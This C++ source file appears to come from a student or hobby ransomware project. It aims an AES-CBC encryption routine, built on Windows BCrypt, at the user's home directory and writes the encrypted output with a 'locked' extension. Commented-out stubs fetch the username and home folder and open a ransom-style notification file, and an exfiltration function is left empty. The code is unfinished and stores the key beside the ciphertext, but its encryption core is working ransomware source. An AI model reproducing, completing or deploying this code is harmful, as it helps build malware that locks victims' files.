
#include "Encryption.h"



using namespace boost::filesystem;
using std::string;

void encrypt(string path);


string get_username();
string get_home();
void send();
void notify();
DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);


int main(int argc, char* argv[]) {
//	crypt_data* d = generatekey();//TODO also move to encrypt

#ifdef DEBUG
	string path = "C:\\Programming\\RansomWare\\236499\\test\\rans.txt";
#else
	string path = get_home();
#endif

	encrypt(path);
//	iterate(path);

//#ifdef DEBUG
//	std::cout << "Username: " << get_username() << std::endl;
//	encrypt(d, "./README.md");
//#endif
//
//	send();
//
//	delete d;
//
//	notify();
//
	return 0;
}


DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
{
	DWORD status;
	status = BCryptGenRandom(NULL, *iv, IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if(!NT_SUCCESS(status)) {
		return status;
	}
	status = BCryptGenRandom(NULL, *key, KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

void encrypt(string path) 
{
	DWORD status;

	size_t plainTextLen = getFileSize(path);
	std::ifstream plaintextFile;
	plaintextFile.open(path, std::ios::binary);
	BYTE* plainText = new BYTE[plainTextLen+1];
	char c;
	for (size_t i = 0; i < plainTextLen; ++i) {
		plaintextFile.get(c);
		plainText[i] = c;
	}
	plainText[plainTextLen] = '\0';
	plaintextFile.close();

	PBYTE iv =  (PBYTE)HeapAlloc(GetProcessHeap(),0,IV_LEN);
	PBYTE key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);

	status = generateKeyAndIV(&iv, &key);
	if(!NT_SUCCESS(status)) {
		//TODO cleanup
		std::cout << "key and IV set FAIL";//TODO remove if doesn't show
	}
	//keep in persistant file


#ifdef DEBUG
	// Print key and initialization vector
	std::cout << "Key:\t\t" << key << std::endl;
	std::cout << "IV:\t\t" << iv << std::endl;
	std::cout << "PALINTEXT LEN : \t\t" << plainTextLen << std::endl;
	std::cout << "Plaintext:\t" <<(char*) plainText << std::endl;
#endif
	

	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if(!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	ULONG res;
	char blockLen[50] ={0};
	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50,&res, 0);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	//TODO verify compatible block length
	BCRYPT_KEY_HANDLE keyHandle;
	status = BCryptGenerateSymmetricKey(aesHandle, &keyHandle, NULL, 0, key, KEY_LEN, 0);
	if (!NT_SUCCESS(status)) {
		std::cout << "BAD KEY HANDLE" << std::endl;
		//TODO cleanup
	}

	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	DWORD cipherSize,resSize;
	//CHECK IF NEEDED V
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if(NULL == tmpIv) {
		//cleanup
	}
	memcpy(tmpIv, iv, IV_LEN);
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}

	PBYTE cipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
	if(NULL == cipherText) {
		//cleanup
	}
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, cipherText, cipherSize, &resSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
#ifdef DEBUG
	std::cout << "Ciphertext:\t" << cipherText << std::endl;
#endif
	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
	ofile.write((char*)iv, IV_LEN);
	ofile.write((char*)key, KEY_LEN);
	ofile.write((char*)cipherText, cipherSize);
	ofile.close();

	delete plainText;
	//TODO CLEANUP!!!!!
}







//string get_username() {
//#ifdef _WIN32
//	char username[UNLEN + 1];
//	DWORD length = UNLEN + 1;
//	GetUserName(username, &length);
//
//	return string(username);
//#else
//	struct passwd *pw;
//
//	uid_t uid = geteuid();
//	pw = getpwuid(uid);
//	if (pw) {
//		return string(pw->pw_name);
//	}
//
//	return EMPTY;
//#endif
//}
//
//string get_home() {
//#ifdef _WIN32
//	string path;
//
//	char* drive = getenv("USERPROFILE");
//	if (drive == NULL) {
//		throw runtime_error("USERPROFILE environment variable not found");
//	}
//	else {
//		path = drive;
//	}
//
//	return path;
//#else
//	struct passwd *pw;
//
//	uid_t uid = geteuid();
//	pw = getpwuid(uid);
//	if (pw) {
//		return string(pw->pw_dir);
//	}
//
//	return EMPTY;
//#endif
//}
//
//void notify() {
//	if (OPEN_FILE) {
//		std::ofstream ofile(NOTIFY_FILENAME);
//		ofile.write(NOTIFY_MESSAGE, sizeof(NOTIFY_MESSAGE));
//		ofile.close();
//
//		system((string("start ") + NOTIFY_FILENAME).c_str());
//	}
//}
//
//void send() {
//
//}
